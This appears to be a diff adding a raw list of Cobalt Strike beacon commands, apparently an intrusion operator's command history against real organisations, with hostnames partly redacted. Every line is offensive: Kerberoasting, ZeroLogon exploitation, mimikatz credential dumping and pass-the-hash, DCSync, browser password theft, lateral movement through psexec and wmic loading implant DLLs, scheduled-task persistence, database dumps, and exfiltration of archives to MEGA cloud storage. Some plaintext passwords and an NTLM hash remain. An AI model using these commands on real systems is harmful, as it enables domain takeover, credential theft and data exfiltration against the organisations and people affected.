@@ -1,0 +1,1325 @@
+# CobaltStrike commands and LOLBins:
+
+beacon> powershell-import D:\Other\Invoke-Kerberoast.ps1
+beacon> psinject 2384 x64 Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath c:\ProgramData\pshashes.txt -append -force -encoding UTF8
+beacon> shell MEGAclient.exe put -q --ignore-quota-warn \\192.168.33.20\E$\Data1\for Vincent\Data\2020Workpapers.7z /
+beacon> execute-assembly C:\soft\SharpZeroLogon.exe CORIGINDC1.REDACTED.com -patch
+beacon> getsystem
+beacon> getsystem
+beacon> inject 912 null https_spotver
+beacon> sleep 2
+beacon> hashdump
+beacon> logonpasswords
+beacon> execute-assembly C:\soft\SharpChrome\SharpChrome.exe logins /showall
+beacon> execute-assembly C:\soft\Net-GPPPassword\Net-GPPPassword.exe
+beacon> execute-assembly C:/soft/Seatbelt/Seatbelt.exe -group=all -outputfile="C:\ProgramData\seatinfo.txt"
+beacon> execute-assembly C:\soft\SharpZeroLogon.exe REDACTED2019DC.REDACTED.local
+beacon> portscan 192.168.0.0/24 445
+beacon> shell check-sonik.exe https://107.0.27.225 C:\.....\sessions.json
+beacon> shell ping ETLHODOPR01.REDACTED.com
+beacon> execute-assembly C:\soft\SharpZeroLogon.exe ETLHODOPR01.REDACTED.com -reset
+beacon> shell dir \\173.232.146.32\aksdjaklsdj
+beacon> shell dir \\172.93.110.126\c$
+beacon> getuid
+beacon> upload implant.exe \\DC1\c$\windows\temp\implant.exe__.  
+beacon> execute-assembly /home/user/soft/ActiveDirectory/adfind/AdFind.exe
+beacon> shell net helpmsg 5
+beacon> net helpmsg 1326
+beacon> mimikatz sekurlsa::pth /user:REDACTEDTLBK4$ /domain:REDACTED.com /ntlm:REDACTED
+beacon> shell dir \\REDACTEDTLBK4\c$
+beacon> portscan 192.168.0.0/24 445
+beacon> dazzleUP
+beacon> shell nslookup 10.30.0.1
+beacon> mimikatz sekurlsa::pth /user:REDACTEDTLBK4$ /domain:REDACTED.com /ntlm:REDACTED
+beacon> shell dir \\REDACTEDTLBK4\c$
+beacon> execute-assembly C:\soft\SharpZeroLogon.exe CORIGINDC1.REDACTED.com -patch
+beacon> AV_Query
+beacon> jump psexec64 10.16.181.12 smb_L
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe Angel Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe bbuerck Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe canceleta Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe DHaase Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe orgbarracuda Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe Uptime Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe adonixadmin Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe barracuda Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe BGW Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe cevansa Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe EntAdmin Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe sagert Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe veeam Administrator REDACTED
+beacon> 
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe alloyamms Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe BarracudaBUP Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe CAncelet Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe citrix_svc Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe gahbarracuda Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe Services_Backup Administrator REDACTED
+beacon> 
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe wstangea Administrator REDACTED
+beacon> execute-assembly /home/wevvewe/Desktop/working/Tools/exec-ass/SharpSniper.exe Administrator Administrator REDACTED
+beacon> shell sqlcmd -S 10.89.11.15,1433 -E -Q "BACKUP DATABASE 'Remote Desktop Services' TO DISK='D:\temporary\Remote Desktop Services.bak'"
+beacon> shell sqlcmd -S 10.89.0.99,1433 -E -Q "BACKUP DATABASE KLCAuditReporting TO DISK='D:\temporary\KLCAuditReporting.bak'"
+beacon> shell sqlcmd -S 89.0.0.121,1433 -E -Q "use InsightEnt; exec sp_tables" -W
+beacon> shell sqlcmd -S 89.0.0.121,1433 -E -Q "use Intermec; exec sp_tables" -W
+beacon> shell sqlcmd -S 89.0.0.121,1433 -E -Q "use SmartSystems; exec sp_tables" -W
+beacon> shell sqlcmd -S 89.0.0.121,1433 -E -Q "use WimanDB; exec sp_tables" -W
+beacon> shell sqlcmd -S 89.0.0.121,1433 -E -Q "use Workforce; exec sp_tables" -W
+beacon> shell sqlcmd -S 10.89.11.118,1433 -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S 10.89.0.52,1433 -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S 89.0.0.121,1433 -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S 10.1.1.243,49289 -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S 10.89.0.99,1433 -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S 10.89.11.15,1433 -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S localhost -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> shell sqlcmd -S localhost -E -Q "SELECT name FROM master.dbo.sysdatabases;"
+beacon> portscan 10.69.0.35 445 none
+beacon> shell dir \\dcwas79.REDACTED.com\D$
+beacon> shell dir \\dcveeam01.REDACTED.com\F$
+beacon> shell dir \\bod01-bkp01.eu.REDACTED.com\F$
+beacon> shell dir \\BBDC03.REDACTED.co.uk\C$
+beacon> shell dir \\192.168.3.8\C$\readme.txt
+beacon> shell dir \\192.168.3.7\C$\readme.txt
+beacon> jump psexec 170.7.5.10 smb
+beacon> jump psexec 170.7.41.214 smb
+beacon> shell ping HQTAS37
+beacon> shell ping HQTAS65
+beacon> shell dir \\BBDC03.REDACTED.co.uk\vCenterBackups
+beacon> shell dir \\BBDC03.REDACTED.co.uk\SQL_Server
+beacon> shell dir \\BBDC03.REDACTED.co.uk\SQL_Server\App
+beacon> shell dir \\BBDC03.REDACTED.co.uk\SQL_Server\Sys
+beacon> shell net view \\10.0.6.56
+beacon> shell net use
+beacon> shell dir N:
+beacon> shell type C:\readme.txt
+beacon> portscan 10.30.17.24 445 none
+beacon> shell ipconfig /all
+beacon> shell reg query HKCU\Environment
+beacon> net domain
+beacon> shell whoami
+beacon> shell net accounts /dom
+beacon> shell net user panderson /dom
+beacon> shell osql.exe -U sa
+beacon> portscan 10.10.1.41 61340
+beacon> portscan 10.10.1.41
+beacon> portscan 10.7.18.36
+beacon> portscan 10.7.19.25 1433
+beacon> hashdump
+beacon> net domain
+beacon> net domain
+beacon> net domain_controllers
+beacon> shell net localgroup Administrators
+beacon> shell net group "Domain Admins" /dom
+beacon> shell net group "Enterprise Admins" /dom
+beacon> shell dir \\10.7.6.127\C$
+beacon> shell type \\10.7.6.127\C$\SA.txt
+beacon> execute-assembly /home/user/Desktop/SharpTools/Sharp-SMBExec.exe hash:REDACTED username:DC$ domain:. target:DC.testlab.local command:rundll32 C:\x64.dll entryPoint -debug
+beacon> net domain
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe superlogin
+beacon> shell type C:\MultiLink\README.txt
+beacon> portscan 10.1.10.0/16 445 icmp 1024
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpWeb.exe all
+beacon> psinject 1636 x64 Invoke-ShareFinder -Domain Northerntrust.local | Out-File sharfindINFO.txt
+beacon> psinject 1636 x64 Invoke-ShareFinder | Out-File sharfindINFO.txt
+beacon> net domain
+beacon> shell dir \\89.0.10.104\Videos
+beacon> net domain
+beacon> help mv
+beacon> help cp
+beacon> net domain
+beacon> execute-assembly /home/user/tools/ShWeb/SharpWeb.exe all
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpWeb.exe all
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpChrome.exe logins /showall
+beacon> shell net user GPJHelp
+beacon> shell dir \\192.168.120.28\C$
+beacon> shell dir \\10.200.100.42\C$
+beacon> shell dir \\192.168.140.3\C$
+beacon> shell dir \\192.168.221.42\C$
+beacon> shell dir \\192.168.120.28\C$
+beacon> shell net group "Domain Admins" /dom
+beacon> download C:\ProgramData\trustdmp_17.txt
+beacon> hashdump
+beacon> shell net localgroup Administrators
+beacon> execute-assembly Rubeus.exe brute /users:C:\ProgramData\user.txt /password:C:\ProgramData\pass.txt /dc:REDACTED
+beacon> mimikatz sekurlsa::pth /user:Linux /domain:PKGPROD /ntlm:REDACTED /run "net use * "\\192.168.168.10\C$" /persistent:no"
+beacon> shell net use * "\\192.168.168.10\C$" /persistent:no /user:PKGPROD\Linux REDACTED
+beacon> shell net use G: \\192.168.168.15\C$\temp /user:PKGPROD\Linux REDACTED
+beacon> shell net use G: \\192.168.168.66\C$\temp /user:PKGPROD\Linux REDACTED
+beacon> shell net use G: \\192.168.168.66\C$\temp /user:PKGPROD\jess REDACTED
+beacon> shell net use G: \\192.168.168.66\C$\temp /user:PKGPROD\jess REDACTED
+beacon> shell net user Linux /dom
+beacon> remote-exec psexec 10.102.71.35 rundll32 C:\Windows\Temp\x64.dll entryPoint
+beacon> shell wmic /node:78186W7P os get osarchitecture`
+beacon> shell rundll32 C:\Windows\system32\mrtsvc.dll entryPoint
+beacon> shell schtasks /query
+beacon> spawn vew
+beacon> hashdump
+beacon> logonpasswords
+beacon> shell copy x64.dll \\139.62.166.164\C$\ProgramData
+beacon> shell wmic /NODE:139.62.166.164 process call create "rundll32 C:\ProgramData\x64.dll entryPoint"
+beacon> shell dir \\139.62.166.164\C$\ProgramData\x64.dll
+beacon> psinject 15344 x64 Invoke-Kerberoast -domain itstest.ad | fl
+beacon> net domain
+beacon> shell ping PHONEBILLING.REDACTEDcsd.REDACTED.edu
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt
+beacon> net domain_trusts
+beacon> net domain_controllers
+beacon> net domain
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/Ghostpack-CompiledBinaries-master/Rubeus.exe asreproast /domain:ru.REDACTED.com
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/Ghostpack-CompiledBinaries-master/Rubeus.exe asreproast /domain:tsi.REDACTED.com
+beacon> execute-assembly Rubeus.exe kerberoast /domain:ru.REDACTED.com
+beacon> psinject 24992 x86 invoke-kerberoast -domain ru.REDACTED.com | fl
+beacon> powerpick invoke-kerberoast | fl
+beacon> psinject 24992 x86 invoke-kerberoast | fl
+beacon> powerpick Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target 172.20.3.7 -Command "tasklist" -Attack Enumerate,Execute,Session
+beacon> shell net group "Domain Admins" /dom
+beacon> net domain
+beacon> portscan 3.15.36.195 80,443 icmp 2
+beacon> shell ping signon.jdisonline.com
+beacon> portscan 3.15.36.195 445,139 icmp 2
+beacon> shell wmic /NODE:172.31.190.103  /privileges:enable  OS GET Name,OSArchitecture
+beacon> shell ping LRH-NESSUS01.REDACTED.local
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpWeb.exe all
+beacon> logonpasswords
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SafetyKatz.exe
+beacon> shell ping Scott.REDACTED.local
+beacon> portscan 172.31.190.47 80,443,25,110,995,143,993,465 icmp 10
+beacon> net dclist
+beacon> shell nltest /dclist:REDACTED
+beacon> shell nltest /dclist:REDACTED.loc
+beacon> net domain_controllers
+beacon> shell dir "C:\Users\Djarden\AppData\Local\Microsoft\Edge\User Data\Default\History"
+beacon> shell dir "C:\Users\Djarden\AppData\Local\Microsoft\Edge\User Data\Default\"
+beacon> shell dir "C:\Users\Djarden\AppData\Local\Microsoft\Edge\User Data\"
+beacon> shell dir "C:\Users\Djarden\AppData\Local\Microsoft\Edge\"
+beacon> shell ping -n 1 asdasdasdsa.sadasdsadsa.REDACTED.com
+beacon> shell ping -n 1 REDACTED.com
+beacon> shell ping -n 1 www.REDACTED.com
+Binary file (standard input) matches
+beacon> shell net user nddevbernst /dom
+beacon> portscan 192.168.0.119 1-10000 icmp 1024
+beacon> hashdump
+beacon> shell dir \\89.0.192.165\C$
+beacon> shell ping -n 1 sa.REDACTED.com
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe NathanK ITC\br_admin REDACTED
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe NathanK
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe egl_admin ITC\br_admin REDACTED
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe egl_admin ITC\egl_admin REDACTED
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe johnnyp ITC\br_admin REDACTED
+beacon> pth ITC\br_admin REDACTED
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe egl_admin
+beacon> shell dnscmd us.REDACTED.com /info
+beacon> shell dnscmd REDACTED.us.REDACTED.com /info
+beacon> portscan 89.0.10.104 1-10000 icmp 200
+beacon> shell copy places.sqlite places.sqlite.back
+beacon> download C:\Users\mharper\AppData\Roaming\Mozilla\Firefox\Profiles\krbjz40r.default-1588080079106\places.sqlite
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpWeb.exe all
+beacon> rev2self
+beacon> make_token .\administrator REDACTED
+beacon> jump psexec_psh AWS-VDDC01 https
+beacon> shell net group "domain admins" /dom && net group "enterprise admins" /dom && net localgroup administrators
+beacon> net domain_controllers
+beacon> net domain
+beacon> net view \\HK-VPDC01 /all
+beacon> net view \\AWS-VDDC01 /all
+beacon> psinject 7256 x64 Invoke-ShareFinder
+beacon> net view \\hostname /all
+beacon> hashdump
+beacon> run rundll32 c:\Users\abinash.pattnayak\AppData\Local\Microsoft\XboxLive\AuthStateCache.dll entryPoint
+beacon> shell tasklist /s 10.225.10.53 /v
+beacon> shell ping USHDC1-REDACTED.datacenter.local
+beacon> shell ping USHDC1-REDACTED.datacenter.local
+beacon> shell tasklist /s 10.225.10.202 /v
+beacon> pth datacenter.local\Administrator REDACTED
+beacon> shell wmic /node:10.225.10.201 process call create "cmd /c ping stormname.com > C:\ProgramData\p.txt"
+beacon> shell type \\10.225.10.201\C$\ProgramData\p.txt
+beacon> rm \\10.225.10.201\C$\ProgramData\p.txt
+beacon> upload /home/user/Desktop/cobalt/dll_maker/x64.dll
+beacon> shell copy x64.dll \\10.225.10.201\C$\ProgramData\
+beacon> shell wmic /node:10.225.10.201 process call create "rundll32 C:\ProgramData\x64.dll entryPoint"
+beacon> shell dir \\10.225.10.201\C$\ProgramData\x64.dll
+beacon> shell type \\10.225.10.201\C$\ProgramData\sq.txt
+beacon> shell ping REDACTED.com
+beacon> pth datacenter.local\Administrator REDACTED
+beacon> shell dir \\10.225.10.201\C$\ProgramData\
+beacon> shell wmic /node:10.225.10.201 process call create "cmd /c ping google.com > C:\ProgramData\p.txt"
+beacon> shell type \\10.225.10.201\C$\ProgramData\p.txt
+beacon> rm \\10.225.10.201\C$\ProgramData\p.txt
+beacon> shell dir
+beacon> shell copy x64.dll \\10.225.10.201\C$\ProgramData\
+beacon> shell wmic /node:10.225.10.201 process call create "rundll32 C:\ProgramData\x64.dll entryPoint"
+beacon> shell dir \\10.225.10.201\C$\ProgramData\x64.dll
+beacon> shell type \\10.195.100.1\C$\ProgramData\p.txt
+beacon> shell wmic /node:10.195.100.1 process call create "cmd /c ping google.com > C:\ProgramData\p.txt"
+beacon> shell dir \\10.195.100.1\C$\ProgramData\p.txt
+beacon> pth SaigProd.local\svc.sccmcliinst REDACTED
+beacon> ls \\10.195.100.1\C$\ProgramData
+beacon> pwd
+beacon> cd C:\ProgramData
+beacon> upload /home/user/Desktop/cobalt/dll_maker/x64.dll
+beacon> shell copy x64.dll \\10.195.100.1\C$\ProgramData
+beacon> shell dir \\10.195.100.1\C$\ProgramData
+beacon> shell dir \\10.195.100.1\C$\ProgramData\x64.dll
+beacon> shell wmic /node:10.195.100.1 process call create "rundll32 C:\ProgramData\x64.dll entryPoint"
+beacon> shell dir \\10.195.100.1\C$\ProgramData\x64.dll
+beacon> shell wmic /node:169.254.195.31 process call create "ping google.com>C:\ProgramData\SOOQA.txt"
+beacon> shell wmic /node:169.254.195.31 process call create "ping google.com>C:\Windows\Temp\SOOQA.txt"
+beacon> shell wmic /node:169.254.195.31 process call create "ping google.com>C:\Windows\Temp\SOOQA.txt"
+beacon> shell dir
+beacon> shell ping google.com > C:\ProgramData\output.txt
+beacon> cd C:\ProgramData
+beacon> shell dir
+beacon> shell wmic /node:10.225.10.200 process call create "ping google.com>C:\Windows\Temp\output.txt"
+beacon> shell wmic /node:10.225.10.200 process call create "rundll32 C:\Windows\Temp\x64.dll entryPoint"
+beacon> shell wmic /node:172.31.190.100 /user:JDOSSN\nddevbernst /password:REDACTED OS GET Name
+beacon> shell net use * \\172.31.190.100\C$ /user:JDOSSN\nddevbernst REDACTED
+beacon> shell net use \\172.31.190.101\C$\
+beacon> net share \\172.31.190.101
+beacon> shell dir \\172.31.190.100\C$\ProgramData
+beacon> shell dir \\172.31.190.101\C$\ProgramData
+beacon> shell dir \\172.31.190.102\C$\ProgramData
+beacon> shell net group "domain admins" /dom
+beacon> shell dir \\172.31.190.100\c$
+beacon> execute-assembly /home/omar/Desktop/Fast-Guide/Net-GPPPassword.exe
+beacon> shell systeminfo
+beacon> shell net view \\10.16.239.134\
+beacon> shell net use * \\10.0.53.26\dump
+beacon> shell net use * \\10.0.53.26\engrade
+beacon> shell net view \\10.0.53.26\
+beacon> shell net view \\10.0.53.26\
+beacon> shell net view \\10.0.50.1\
+beacon> shell net view \\10.0.53.25\
+beacon> shell net view \\10.51.200.121\
+beacon> shell net view \\10.0.61.61\
+beacon> shell net view \\10.0.61.57\
+beacon> shell net view \\10.0.53.230\
+beacon> shell net view \\10.116.200.121\
+beacon> shell net view \\10.58.200.121\
+beacon> shell net view \\10.0.53.25\
+beacon> shell net view \\10.0.50.1\
+beacon> shell net view \\10.0.53.26\
+beacon> shell net view \\10.51.200.121\
+beacon> shell net view \\10.0.61.61\
+beacon> shell dir \\10.0.61.61\E$
+beacon> shell net use * \\10.0.61.61\C$
+beacon> portscan 10.0.61.69 445,135,139
+beacon> shell net view \\10.0.61.69 /all
+beacon> shell wmic /node:10.0.61.69 os get name
+beacon> shell wmic /node:10.0.61.69 logicaldisk get description,name
+beacon> shell net use * \\10.0.61.69\C$
+beacon> shell net use \\10.100.7.16\c$ REDACTED /user:Administrator
+beacon> shell net use \\10.100.7.16\c$ consolidate_16 /user:Administrator
+beacon> shell ping -n 1 REDACTED.com
+beacon> shell ipconfig /all
+beacon> shell dnscmd /enumzones > AllZones.txt
+beacon> shell dir C:\windows\system32\dns
+beacon> shell ping -n 1 SYD-WSUS-01
+beacon> shell ping -n 1 DEN-SCCM-01
+beacon> shell ping -n 1 DEN-WSUS-01
+beacon> mimikatz kerberos::list
+beacon> exit
+beacon> shell wmic nic get name, index
+beacon> shell wmic path win32_networkadapter where index=4 call enable
+beacon> shell wmic path win32_networkadapter where index=5 call enable
+beacon> shell wmic /node:10.28.92.159 OS GET Name
+beacon> shell dir \\10.28.92.159\ADMIN$
+beacon> shell net localgroup "administrators"
+beacon> pth REDACTED.COM\aandaservice REDACTED
+beacon> shell copy x64.dll \\192.168.100.227\C$\ProgramData\x64.dll
+beacon> pth REDACTED\aandaservice REDACTED
+beacon> shell SCHTASKS /Create /u KORBEL\daniel.harvey_adm /p REDACTED /tn "Microsoft autoupdate#98189" /tr "cmd.exe /c rundll32 c:\windows\system32\ds64gt.dll entryPoint" /sc onstart /RU SYSTEM
+beacon> mimikatz !lsadump::backupkeys /system:z1ad2.REDACTED.local /export
+beacon> shell ping -n 1  vcz1dc1
+beacon> shell PsExec64.exe \\10.10.0.38 -accepteula -s -d rundll32 C:\windows\temp\ccs.dll entryPoint
+beacon> desktop
+beacon> portscan itvm1 3389 none 1
+beacon> net domain_controllers
+beacon> shell rundll32 C:\Users\Dorinda.alredge\appdata\roaming\Adobe\cache.dll entryPoint
+beacon> shell dir C:\
+beacon> shell net use
+beacon> shell net use \\172.24.2.8\c$ "REDACTED" /user:GlobalTranz.local\joel.reed
+beacon> shell net use \\10.222.0.100\c$ "REDACTED" /user:GlobalTranz.local\joel.reed
+beacon> edr_query localhost x64
+beacon> powershell-import /home/trash/tools/Invoke-Kerberoast.ps1
+beacon> psinject 10292 x64 Invoke-Kerberoast -OutputFormat HashCat | fl
+beacon> whoami
+beacon> shell whoami
+beacon> execute-assembly /home/user/TOOLS/2/SharpShares.exe shares
+beacon> pth ".\Remote Support" aad3b435b51404eeaad3b435b51404ee:296c19b3d2cb8e8729e5fe27f6cf764a
+beacon> portscan 172.0.0.1/24 21,22,23,25,53,80,81,110,119,137,139,143,443,445,465,587,993,995,1080,1194,1433,3306,3389,5500,5800,5900-5906,8080,9001,9030,9050,9051,9090,9091,9100 icmp 1024
+beacon> portscan 172.0.0.1/24 445 icmp 1024
+beacon> shell ping  10.69.201.21
+beacon> shell ping -n 1 10.69.201.21
+beacon> portscan 10.69.201.21 445,443,5000 icmp 1024
+beacon> portscan 10.69.201.21 22 icmp 1024
+beacon> portscan 10.69.201.21 80 icmp 1024
+beacon> portscan 10.69.201.21 1-1000 icmp 1024
+beacon> portscan 10.69.201.21 1001-5000 icmp 1024
+beacon> portscan 10.69.201.21 5001-10000 icmp 1024
+beacon> shell nltest /dclist:
+beacon> shell net accounts
+beacon> net domain
+beacon> net domain_controllers
+beacon> shell nltest /dclist:REDACTED.com
+beacon> shell net accounts /dom
+wevbeacon> psinject 4540 x64 Invoke-ShareFinder
+beacon> portscan 10.69.0.35 445 none
+beacon> shell dir
+beacon> shell C:\hp\Updater.exe
+beacon> run C:\hp\Updater.exe
+beacon> execute C:\hp\Updater.exe
+beacon> pth pkgprod\linux REDACTED
+beacon> shell net user "Administrator" /dom
+beacon> pth .\Administrator REDACTED
+beacon> dcsync pkgprod.local
+beacon> pwd
+beacon> run AdFind.bat
+beacon> spawn https
+beacon> make_token JDOSSN\nddevbernst REDACTED
+beacon> shell dir \\10.28.92.108\C$
+beacon> make_token REDACTED.local\nmsapps REDACTED
+beacon> shell net use * \\10.5.68.221\C$
+beacon> shell net use * \\10.10.222.20\C$
+beacon> shell net use * \\10.5.68.99\C$
+beacon> shell net use * \\10.91.18.115\C$
+beacon> shell net use * \\10.5.68.119\C$
+beacon> shell net use * \\10.10.220.140\C$
+beacon> shell ping 10.10.220.140
+beacon> shell dir C:\
+beacon> portscan 10.10.30.57 3389
+beacon> jump psexec 10.10.30.57 pipe
+beacon> shell wmic /node:10.10.30.57 share get caption,name,path
+beacon> execute-assembly SharpSharesNG.exe shares 10.10.30.57
+beacon> shell wmic /node:10.10.30.57 OS get NAME
+beacon> portscan 192.168.16.0/24 23,22,80,1433,135,445,3389,5900
+beacon> portscan 192.168.16.0/24
+beacon> shell ping INTEG-DRBD-XP64
+beacon> shell ping INTEG-XP1
+beacon> shell adfind.exe -b DC=REDACTED,DC=com -f "(objectcategory=person)" > ad_users.txt
+beacon> shell adfind.exe -b DC=REDACTED -f "(objectcategory=person)" > ad_users.txt
+beacon> shell adfind.exe -b DC=eu,DC=REDACTED,DC=com -f "(objectcategory=person)" > ad_users.txt
+beacon> shell adfind.exe -b DC=eu,DC=REDACTED,DC=com -f "(objectcategory=person)" > ad_users.txt
+beacon> net domain
+beacon> ls \\admindc1\c$
+beacon> ls \\admindc2\c$
+beacon> ls \\admindc3\c$
+beacon> ls \\admindc4\c$
+beacon> ls \\admindc5\c$
+beacon> ls \\dhcp02\c$
+beacon> ls \\kms\c$
+beacon> ls \\hyperv24\c$
+beacon> shell net use * \\DCWAS08.REDACTED.com\C$ VantgagePoint /user:REDACTED\rockwell
+beacon> shell net localgroup "Administrators"
+beacon> shell net group "Domain admins" /dom
+beacon> shell net group "Enterprise Admins" /dom
+beacon> shell ping francedc1
+beacon> shell ping francedc1.REDACTED.local
+beacon> shell ipconfig /all
+beacon> spawn u7
+beacon> spawn u7
+beacon> spawn https
+beacon> shell ping LRHVCENTER
+beacon> shell dir \\10.5.50.15\C$
+beacon> shell dir \\10.5.50.2\C$
+beacon> shell ping NSTORE0.REDACTED.mig
+beacon> shell dir \\192.168.254.110\C$
+beacon> jump winrm 192.168.254.110 pipe
+beacon> jump winrm 192.168.254.110 https
+beacon> jump psexec 192.168.254.110 https
+beacon> jump psexec 192.168.254.110 pipe
+beacon> hashdump
+beacon> logonpasswords
+beacon> shell net localgroup "Administrators"
+beacon> shell ping -n 1 CLEBACKUP.REDACTED.com
+beacon> portscan 192.168.0.105 445,21,22,3389,443
+beacon> portscan 10.225.10.200 445 icmp 1024
+beacon> shell nslookup 10.225.10.200
+beacon> shell ping datacenter.local
+beacon> shell ping 10.225.10.200
+beacon> shell wmic /node:192.168.110.198 logicaldisk get caption /user:dom.REDACTED.com\abunag /password:REDACTED
+beacon> shell net use
+beacon> shell wmic /node:loomiswebsrv4 logicaldisk get caption
+beacon> shell wmic /node:loomisgw2 logicaldisk get caption
+beacon> jump psexec 10.10.10.5 pipe
+beacon> jump psexec loomiswebsrv4 pipe
+beacon> jump psexec_psh loomisgw2.REDACTED.com https
+beacon> jump psexec_psh TLCWEBT1.REDACTED.com https
+beacon> jump psexec_psh loomiswebsrv4.REDACTED.com https
+beacon> shell def.bat
+beacon> jump psexec_psh TLCBENTS02.REDACTED.com https
+beacon> jump psexec_psh TLCBENTS01.REDACTED.com https
+beacon> jump psexec_psh TLCRDSLIC1.REDACTED.com https
+beacon> jump psexec_psh TLCEPICTS02.REDACTED.com https
+beacon> jump psexec_psh TLCEPICTS01.REDACTED.com https
+beacon> shell ping -n 10.10.1.24
+beacon> shell net use
+beacon> ls \\10.10.1.181\c$
+beacon> psinject 13584 x86 Get-DomainUser -Server 10.50.212.45 | out-file -filepath "C:\ProgramData\ad_users.txt"
+beacon> run AdFind.bat
+beacon> shell AdFind.bat
+beacon> shell dir
+beacon> net domain
+beacon> shell ping -a 127.0.1.1
+beacon> shell nslookup 127.0.1.1
+beacon> shell ping REDACTED.com
+beacon> portscan 72.52.147.20 1-30,135,139,443,445
+beacon> shell net accounts /dom
+beacon> shell net group "domain admins" /dom
+beacon> shell ping -n 1 192.168.0.192
+beacon> portscan PDITESTSQL.REDACTED.com
+beacon> portscan reporting.REDACTED.com
+beacon> portscan WWSQL2Old.REDACTED.com
+beacon> portscan wwsql02.REDACTED.com
+beacon> help rportfwd
+beacon> ls E:\Backups\REDACTED
+beacon> ls E:\Backups\REDACTED
+beacon> shell ping -n 1 10.89.11.40
+beacon> shell net localgroup administrators
+beacon> shell net group "Domain admins" /dom
+beacon> shell net group "Enterprise admins" /dom
+beacon> shell ping 172.16.1.247 -n 1
+beacon> shell ping 172.16.1.83 -n 1
+beacon> shell ping 172.16.1.61 -n 1
+beacon> shell ping BOBXPS.REDACTED.com
+beacon> shell ping REDACTED.REDACTED.com
+beacon> shell dir \\192.168.90.3\D$
+beacon> shell dir \\192.168.0.18\C$
+beacon> shell wmic /node:192.168.90.3 logicaldisk get description,name
+beacon> shell wmic /node:192.168.0.18 logicaldisk get description,name
+beacon> execute-assembly /home/user/Desktop/cobalt/Signature_Tools/exec-ass/SharpSniper.exe Bob Administrator REDACTED
+beacon> shell ping -a -n 1 127.0.1.1
+beacon> shell ping -a 192.168.0.75
+beacon> shell start /b MEGAcmdServer.exe
+beacon> shell MEGAclient.exe update --auto=off
+beacon> shell MEGAclient.exe login REDACTED@upived.online REDACTED
+beacon> shell MEGAclient.exe whoami
+beacon> shell MEGAclient.exe put -q --ignore-quota-warn "C:\Users\Djarden\Documents\Outlook Files\ol.7z"
+beacon> shell net use \\FAMIXXP\c$ rbuilder /user:REDACTED.com\REPORT_BUILDER
+beacon> shell net group "enterprise admins" /dom
+beacon> shell net group "domain admins" /dom
